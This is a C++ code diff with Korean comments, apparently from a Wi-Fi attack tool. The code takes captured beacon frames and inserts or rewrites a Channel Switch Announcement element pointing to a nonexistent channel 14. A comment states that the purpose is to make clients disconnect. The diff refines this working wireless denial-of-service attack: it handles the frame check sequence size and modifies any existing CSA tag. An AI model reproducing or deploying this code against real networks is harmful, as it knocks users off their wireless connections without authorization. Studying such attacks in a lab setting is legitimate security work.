@@ -73,12 +73,16 @@ int main(int argc, char *argv[]) {
             log_write(oss.str());
         }
 
-        
 
-        // Tagged Parameter 범위 (FCS 마지막 4바이트 제외)
+
+        // FCS 크기 확인 (0 or 4)
+        size_t fcs_size = ((RadioTapHdr*)packet)->get_fcs();
+
+        // Tagged Parameter 범위 (FCS 제외)
         const uint8_t* tags_start = (const uint8_t*)beacon->first_tag();
-        const uint8_t* tags_end_ptr = packet + (int)header->caplen - 4;
+        const uint8_t* tags_end_ptr = packet + (int)header->caplen - fcs_size;
 
+        
         // CSA IE: Tag=37, Length=3, [Mode=1, NewChannel=14, Count=1]
         // Mode=1: 채널 전환까지 현재 채널 송신 중단
         // NewChannel=14: 실제로 존재하지 않는 채널 → 연결 해제 유도
@@ -87,26 +91,31 @@ int main(int argc, char *argv[]) {
         bool csa_inserted = false;
 
         // Tag Number 기준 정렬 유지하며 CSA IE 삽입
+        // tag 37이 이미 존재하면 new_ch 값만 변경하여 복사
         vector<uint8_t> new_tags;
-        const uint8_t* p = tags_start;
+        BeaconHdr::Tag* t = (BeaconHdr::Tag*)tags_start;
 
-        while (p < tags_end_ptr && p + 2 <= tags_end_ptr) {
-            uint8_t tag_num = p[0];
-            uint8_t tag_len = p[1];
-
-            if (!csa_inserted && tag_num >= 37) {
-                if (tag_num == 37) {
-                    // 기존 CSA 태그 제거 (중복 방지)
-                    p += 2 + tag_len;
-                    continue;
+        while ((uint8_t*)t + 2 <= tags_end_ptr) {
+            if (t->number == 37) {
+                // 기존 tag 37: length==3이면 new_ch만 변경하여 복사
+                if (t->length == 3 && (uint8_t*)t + 5 <= tags_end_ptr) {
+                    uint8_t mod[5];
+                    memcpy(mod, (uint8_t*)t, 5);
+                    mod[3] = csa_ie[3]; // new_ch 덮어쓰기
+                    new_tags.insert(new_tags.end(), mod, mod + 5);
                 }
+                csa_inserted = true;
+                t = t->next();
+                continue;
+            }
+            if (!csa_inserted && t->number > 37) {
+                // tag 37이 없었던 경우, 정렬 위치에 새로 삽입
                 new_tags.insert(new_tags.end(), csa_ie, csa_ie + sizeof(csa_ie));
                 csa_inserted = true;
             }
-
-            if (p + 2 + (int)tag_len > tags_end_ptr) break;
-            new_tags.insert(new_tags.end(), p, p + 2 + tag_len);
-            p += 2 + tag_len;
+            if ((uint8_t*)t + 2 + t->length > tags_end_ptr) break;
+            new_tags.insert(new_tags.end(), (uint8_t*)t, (uint8_t*)t + 2 + t->length);
+            t = t->next();
         }
 
         // 모든 태그 번호가 37 미만이었던 경우 맨 끝에 삽입
@@ -115,6 +124,7 @@ int main(int argc, char *argv[]) {
         }
 
         // 새 패킷 조립: [Radiotap][Dot11Hdr+Fix][수정된 Tagged Params]
+        // FCS가 존재하면 마지막 fcs_size 바이트를 제외하고 복사
         int fixed_hdr_len = (int)(tags_start - (packet + rt_len));
         vector<uint8_t> new_packet;
         new_packet.insert(new_packet.end(), packet, packet + rt_len + fixed_hdr_len);
